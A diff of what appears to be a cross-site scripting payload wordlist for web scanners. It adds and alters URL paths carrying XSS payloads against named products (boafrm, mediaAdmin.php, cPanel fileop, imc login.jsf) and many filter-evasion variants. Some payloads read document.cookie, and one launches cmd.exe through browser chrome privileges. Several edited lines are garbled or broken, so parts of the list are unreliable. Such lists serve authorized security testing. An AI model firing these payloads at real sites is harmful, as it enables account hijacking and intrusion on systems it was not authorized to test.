@@ -1,3 +1,24 @@
+boafrm/=%3E%3Cscript%3E
+boafrm/=%22%3E%3Cscript%3E
+boafrm/=%27%3E%3Cscript%3E
+boafrm/==22 3e 3c
+admin/mediaAdmin.php?id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+admin/mediaAdmin.php?ID=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+admin/mediaAdmin.php?Id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+profiles/html/simpleSearch.do?/name=test&IMG/Ui
+profiles/html/simpleSearch.do?/name=test&SCRIPT/Ui
+profiles/html/simpleSearch.do?/name=test&SRC/Ui
+profiles/html/simpleSearch.do?/name=test&onkey/Ui
+profiles/html/simpleSearch.do?/name=test&onmouse/Ui
+profiles/html/simpleSearch.do?/name=test&onload/Ui
+Flex/index.template.html?/></object><script>alert('XSS')</script>
+Flex/index.template.html?/></object><script>alert('XSS')</script>
+tools.cisco.com/security/center/viewAlert.x?alertId=18442
+frontend/x3/files/fileop.html?opdir=/example/path&opfile=file_name_example&fileop=XSS
+frontend/x3/files/dofileop.html?fileop=&opdir=&opfile=&dir=%2fhome%2fuser%2ftmp&fileop=HaCkED%20by%20RENO
+imc/login.jsf?loginForm%3a_link_hidden_=&javax.faces.ViewState=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E
+imc/dwr/call/plaincall/blah?callCount=<script>alert(1)</script>
+imc/dwr/interface/<script>alert(1)</script>
 index.php?user=eval('ale' + 'rt(0)');
 index.php?username=Function("ale" + "rt(1)")();
 index.php?password=`al\ert\`6\``;
@@ -8,20 +29,20 @@ index.php?logon=Set.constructor
 index.php?account=`al\x65rt\x2814\x29```;
 index.php?input=window['alert'](0)
 &quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-/search.php?test=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
-/search.php?test=parent['alert'](1)
-/search.php?test=self['alert'](2)
-/search.php?test=top['alert'](3)
-/search.php?test=this['alert'](4)
-/search.php?test=frames['alert'](5)
-/search.php?test=content['alert'](6)
-/search.php?test=[7].map(alert)
-/search.php?test=[8].find(alert)
-/search.php?test=[9].every(alert)
-/search.php?test=[10].filter(alert)
-/search.php?test=[11].findIndex(alert)
-/search.php?test=[12].forEach(alert);
-/search.php?test='te' * alert('*') * 'xt';
+search.php?test=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+search.php?test=parent['alert'](1)
+search.php?test=self['alert'](2)
+search.php?test=top['alert'](3)
+search.php?test=this['alert'](4)
+search.php?test=frames['alert'](5)
+search.php?test=content['alert'](6)
+search.php?test=[7].map(alert)
+search.php?test=[8].find(alert)
+search.php?test=[9].every(alert)
+search.php?test=[10].filter(alert)
+search.php?test=[11].findIndex(alert)
+search.php?test=[12].forEach(alert);
+search.php?test='te' * alert('*') * 'xt';
 index.php?user='te' / alert('/') / 'xt';
 index.php?user='te' % alert('%') % 'xt';
 index.php?topic='te' - alert('-') - 'xt';
@@ -38,7 +59,7 @@ index.php?topic='te' in alert('in') in 'xt';
 index.php?user='te'instanceofalert('instanceof')instanceof'xt';
 index.php?user=\'-alert()//
 index.php?user=(alert)(1)
-index.php?user=a=alert,a(1)
+index.php?a=alert,a(1)
 index.php?user=[1].find(alert)
 index.php?user=top[“al”+”ert”](1)
 index.php?user=top[/al/.source+/ert/.source](1)
@@ -84,10 +105,10 @@ index.php?user=';onerror=alert;throw 1//
 index.php?user=alert(document.cookie)
 index.php?user=alert(document['cookie'])
 index.php?user=with(document)alert(cookie)
-index.php?user=a="get";
-index.php?user=b="URL(\"";
-index.php?user=c="javascript:";
-index.php?user=d="alert('XSS');\")";
+index.php?a="get";
+index.php?b="URL(\"";
+index.php?c="javascript:";
+index.php?d="alert('XSS');\")";
 index.php?user=eval(a+b+c+d);
 index.php?user=<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
 index.php?user=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
@@ -114,30 +135,30 @@ index.php?user=<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 index.php?user=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 index.php?user=<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 index.php?user=sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
-index.php?user=b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
+index.php?b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
 index.php?user=setTimeout// (name// ,0)
 index.php?user=test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
 index.php?user=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 index.php?user=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
-index.php?user=s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+index.php?s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
 index.php?user=123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
-index.php?user=___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
+index.php?___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
 index.php?user=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
-index.php?user=a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
+index.php?a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
 index.php?user=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
 index.php?user=alert(1)
 index.php?user=s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
 index.php?user=<SCRIPT>alert('XSS')</SCRIPT>
 index.php?user=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-index.php?user=a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
-index.php?user=a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
+index.php?a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
+index.php?a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
 index.php?user=eval.call(this,unescape.call(this,location))
-index.php?user=d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
-index.php?user=l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
-index.php?user=_=eval,__=unescape,___=document.URL,_(__(___))
-index.php?user=$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
-index.php?user=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
-index.php?user=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+index.php?==0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
+index.php?l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
+index.php?_=eval,__=unescape,___=document.URL,_(__(___))
+index.php?$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+index.php?$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+index.php?$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
 index.php?user=evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
 index.php?user=with(location)with(hash)eval(substring(1))
 index.php?user=<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
@@ -146,7 +167,7 @@ index.php?user=<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</ST
 index.php?user=<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 index.php?user=<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 index.php?user=<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
-index.php?user=A=alert;A(1)
+index.php?A=alert;A(1)
 index.php?user=<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
 index.php?user=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
 index.php?user='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
@@ -157,7 +178,7 @@ index.php?user=%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
 index.php?user=<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 index.php?user=with(document.__parent__)alert(1)
 index.php?user=<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
-index.php?user=y=<a>alert</a>;content[y](123)
+index.php?y=<a>alert</a>;content[y](123)
 index.php?user='';!--"<XSS>=&{()}
 index.php?user=Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 index.php?user=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
